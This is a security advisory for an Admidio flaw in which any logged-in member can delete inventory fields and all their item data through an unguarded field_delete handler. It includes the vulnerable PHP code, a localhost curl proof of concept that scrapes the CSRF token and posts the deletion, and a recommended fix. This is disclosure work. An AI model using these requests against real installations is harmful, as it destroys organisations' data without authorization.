# [M] Admidio: Any logged-in user can delete inventory fields via `mode=field_delete` — incomplete fix of #2024

## Summary
Severity: Medium
Advisory: GHSA-xw54-c3mx-9pm3
CVE: CVE-2026-47233
CWE: CWE-1281, CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-xw54-c3mx-9pm3
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.10

## Details
## Summary

Commit `d37ca6b27b9674238e58491cf7ba292e66898f15` ("Delete item not check admin rights #2024", 2026-04-12) added a missing `isAdministratorInventory()` gate to `case 'item_delete':` in `modules/inventory.php`. The same fix was not applied to the sibling `case 'field_delete':` handler, which destroys an entire inventory field definition, cascading to every `adm_inventory_item_data` row that referenced that field and every `adm_inventory_field_options` entry. The handler validates only a session-bound CSRF token; there is no `isAdministratorInventory()` check at the controller level, and `Admidio\Inventory\Entity\ItemField::delete()` does not enforce one at the entity level either (unlike its sibling `ItemField::save()`, which does check `$gCurrentUser->isAdministrator()`). Any user who can log in to the site can permanently destroy a non-system inventory field by sending one POST.

## Details

### Vulnerable Code

`modules/inventory.php` mode dispatch at the top of the file:

```php
// modules/inventory.php:64-72  (top-level rights gate)
if ($gSettingsManager->getInt('inventory_module_enabled') === 0) {
    throw new Exception('SYS_MODULE_DISABLED');
} elseif ($gSettingsManager->getInt('inventory_module_enabled') === 2 && !$gValidLogin
    || ($gSettingsManager->getInt('inventory_module_enabled') === 3 && !$gCurrentUser->isAdministratorInventory())
    || ($gSettingsManager->getInt('inventory_module_enabled') === 4 && !InventoryPresenter::isCurrentUserKeeper() && !$gCurrentUser->isAdministratorInventory())
    || ($gSettingsManager->getInt('inventory_module_enabled') === 5 && !$gCurrentUser->isAllowedToSeeInventory() && !$gCurrentUser->isAdministratorInventory())) {
    throw new Exception('SYS_NO_RIGHTS');
}
```

`inventory_module_enabled=2` is the default value (`install/db_scripts/preferences.php`: `'inventory_module_enabled' => '2',`). At this setting the only gate is `$gValidLogin` — any logged-in user reaches the switch.

`modules/inventory.php:123-131` — `field_delete` only checks the session CSRF, not admin rights:

```php
case 'field_delete':
    // check the CSRF token of the form against the session token
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);

    $itemFieldService = new ItemFieldService($gDb, $getinfUUID);
    $itemFieldService->delete();

    echo json_encode(array('status' => 'success', 'message' => $gL10n->get('SYS_INVENTORY_ITEMFIELD_DELETED')));
    break;
```

`SecurityUtils::validateCsrfToken` (`src/Infrastructure/Utils/SecurityUtils.php`) is a session-token compare:

```php
public static function validateCsrfToken(string $csrfToken)
{
    global $gCurrentSession;
    if ($csrfToken !== $gCurrentSession->getCsrfToken()) {
        throw new Exception('Invalid or missing CSRF token!');
    }
}
```

The token is the session's CSRF token, which the actor's own session prints on every page (it appears in `?mode=field_list`'s response in the `data-csrf` JSON callback). So a non-admin attacker has it for free.

`src/Inventory/Service/ItemFieldService.php:46-49` — the service just delegates:

```php
public function delete(): bool
{
    return $this->itemFieldRessource->delete();
}
```

`src/Inventory/Entity/ItemField.php:54-88` — the entity's `delete()` blocks system fields via `inf_system==1` but otherwise has **no `isAdministrator()` check**:

```php
public function delete(): bool
{
    global $gCurrentOrgId;

    if ($this->getValue('inf_system') == 1) {
        // System fields could not be deleted
        throw new Exception('Item fields with the flag "system" could not be deleted.');
    }

    $this->db->startTransaction();

    // close gap in sequence
    $sql = 'UPDATE ' . TBL_INVENTORY_FIELDS . ' SET inf_sequence = inf_sequence - 1 ...';
    $this->db->queryPrepared($sql, ...);

    // delete all data of this field in the item data table
    $sql = 'DELETE FROM ' . TBL_INVENTORY_ITEM_DATA . ' WHERE ind_inf_id = ? -- $infId';
    $this->db->queryPrepared($sql, array($infId));

    // delete all data of this field in the field select options table
    $sql = 'DELETE FROM ' . TBL_INVENTORY_FIELD_OPTIONS . ' WHERE ifo_inf_id = ? -- $infId';
    $this->db->queryPrepared($sql, array($infId));

    $return = parent::delete();        // DELETE FROM adm_inventory_fields WHERE inf_id = ?

    $this->db->endTransaction();
    return $return;
}
```

Compare with `ItemField::save()` at line 230, which *does* enforce admin:

```php
public function save(bool $updateFingerPrint = true): bool
{
    global $gCurrentUser, $gCurrentOrgId;

    // only administrators can edit item fields
    if (!$gCurrentUser->isAdministrator() && !$this->saveChangesWithoutRights) {
        throw new Exception('Item field could not be saved because only administrators are allowed to edit item fields.');
    }
    ...
}
```

The asymmetry is the bug: save is gated, delete is not.

### Sibling Handlers with the Same Shape

Six other state-changing modes in the same file have the same "CSRF only, no `isAdministratorInventory()` check" structure. They are not the subject of *this* advisory but should be patched together when fixing the root cause:

| line | mode | effect |
|---:|---|---|
| 123 | `field_delete` | this advisory |
| 154 | `delete_option_entry` | removes a single option from a dropdown / radio field |
| 171 | `sequence` | reorders fields |
| 347 | `item_retire` | hides items from the active inventory |
| 364 | `item_reinstate` | un-hides items |
| 462 | `item_picture_delete` | deletes an item picture |

Each of these is reachable by any logged-in user under the default `inventory_module_enabled=2`.

## PoC

Tested live on HEAD `c5cde53` with PHP 8.4, MariaDB 11.8 backing on `127.0.0.1:3399`, Admidio served via `php -S 127.0.0.1:8085`. `inventory_module_enabled=2` (default install).

A non-administrator user `lowuser` was created via the admin UI and given only the default `Member` role. The user has no `isAdministratorInventory()` right and is not configured as a keeper. A non-system test field `TESTFIELD` (uuid `cccccccc-2222-3333-4444-deadbeefcafe`) was created via SQL, with `inf_system=0`.

```
# starting state: lowuser is a regular Member; TESTFIELD exists
$ mariadb -uroot -D admidio -e "SELECT inf_id, inf_uuid, inf_name_intern, inf_system FROM adm_inventory_fields WHERE inf_name_intern='TESTFIELD';"
inf_id  inf_uuid                                inf_name_intern  inf_system
8       cccccccc-2222-3333-4444-deadbeefcafe    TESTFIELD        0

# 1. login as lowuser
$ curl -sb $cookie -L "http://127.0.0.1:8085/" -o /tmp/init.html
$ csrf=$(grep -oE 'adm_csrf_token[^"]+value="[^"]+' /tmp/init.html | head -1 | sed 's/.*value="//')
$ curl -sb $cookie \
    --data-urlencode "adm_csrf_token=$csrf" \
    --data-urlencode "plg_usr_login_name=lowuser" \
    --data-urlencode "plg_usr_password=Lowpwd123!" \
    "http://127.0.0.1:8085/system/login.php?mode=check"
{"status":"success","url":"http://127.0.0.1:8085/modules/overview.php"}

# 2. lowuser visits inventory's field_list page (this works under default
#    inventory_module_enabled=2 because $gValidLogin is true)
#    The response contains the session CSRF token in a data callback
$ inv_csrf=$(curl -sb $cookie "http://127.0.0.1:8085/modules/inventory.php?mode=field_list" \
              | grep -oE '"adm_csrf_token":\s*"[^"]+"' | head -1 \
              | sed 's/.*"adm_csrf_token":\s*"//;s/"$//')

# 3. lowuser sends field_delete targeting TESTFIELD
$ curl -sb $cookie -X POST \
    --data-urlencode "adm_csrf_token=$inv_csrf" \
    "http://127.0.0.1:8085/modules/inventory.php?mode=field_delete&uuid=cccccccc-2222-3333-4444-deadbeefcafe"
{"status":"success","message":"Item field successfully deleted"}

# 4. verify
$ mariadb -uroot -D admidio -e "SELECT inf_id, inf_uuid, inf_name_intern FROM adm_inventory_fields WHERE inf_name_intern='TESTFIELD';"
(no rows)
```

The field is gone. `Admidio\Inventory\Entity\ItemField::delete()` ran the four statements (sequence-gap update, `DELETE FROM adm_inventory_item_data`, `DELETE FROM adm_inventory_field_options`, `DELETE FROM adm_inventory_fields`) and committed the transaction. lowuser is a regular Member, holds no inventory-administrator role, was not a keeper, and was not the field's creator.

## Impact

A non-administrator user with the cheapest possible authentication (a normal organisation member account) can permanently destroy any custom inventory field configured by an administrator. Concretely:

* Every per-item value stored against that field across the whole organisation is wiped (`DELETE FROM adm_inventory_item_data WHERE ind_inf_id = <field>`).
* For dropdown / radio / multiselect fields, every option entry is wiped (`DELETE FROM adm_inventory_field_options WHERE ifo_inf_id = <field>`).
* The field definition itself is removed; subsequent inventory exports / item lists silently drop the column.
* There is no in-product undo. Recovery requires restoring from backup.

In practice, a single attacker with one rogue regular-member account can iterate `field_list` to enumerate non-system fields and delete all of them in a few requests. The inventory module's stored data (item names, categories, statuses, custom fields) becomes unrecoverable without a database snapshot.

`PR:L` because any logged-in member is enough; `S:U` because the impact stays inside Admidio's own data; `C:N` because the operation does not leak data; `I:H` because the field row plus all referencing rows are destroyed; `A:H` because the inventory module's user-defined schema is lost.

The bug is a classic **incomplete fix**: commit `d37ca6b` patched the literal endpoint named in issue #2024 (`item_delete`) but did not sweep its siblings. The pattern was raised by the maintainers themselves in commit `12639a4` ("CSRF and Form Validation Bypass in Inventory Item Save via 'imported' Parameter") on `item_save`, again only on the literal reported endpoint.

## Recommended Fix

Add an explicit `isAdministratorInventory()` check at the top of `case 'field_delete':` (and the sibling state-changing handlers listed above), matching the pattern that was applied to `item_delete` in `d37ca6b`:

```php
// modules/inventory.php
case 'field_delete':
    // check the CSRF token of the form against the session token
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);

    // check if user has admin rights for inventory   <-- new
    if (!$gCurrentUser->isAdministratorInventory()) {
        throw new Exception('SYS_NO_RIGHTS');
    }

    $itemFieldService = new ItemFieldService($gDb, $getinfUUID);
    $itemFieldService->delete();

    echo json_encode(array('status' => 'success', 'message' => $gL10n->get('SYS_INVENTORY_ITEMFIELD_DELETED')));
    break;
```

Apply the same patch to `delete_option_entry` (line 154), `sequence` (line 171), `item_retire` (line 347), `item_reinstate` (line 364), and `item_picture_delete` (line 462).

For defense in depth, mirror the entity-level gate from `ItemField::save()` into `ItemField::delete()` at `src/Inventory/Entity/ItemField.php:54`:

```php
public function delete(): bool
{
    global $gCurrentUser, $gCurrentOrgId;

    if (!$gCurrentUser->isAdministrator() && !$this->saveChangesWithoutRights) {
        throw new Exception('Item field could not be deleted because only administrators are allowed to delete item fields.');
    }

    if ($this->getValue('inf_system') == 1) {
        throw new Exception('Item fields with the flag "system" could not be deleted.');
    }
    ...
}
```

A regression test should log in as a non-administrator member, GET `inventory.php?mode=field_list`, post `mode=field_delete` with the captured session CSRF token, and assert the response is `SYS_NO_RIGHTS` rather than `success`.

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-xw54-c3mx-9pm3
- https://github.com/Admidio/admidio
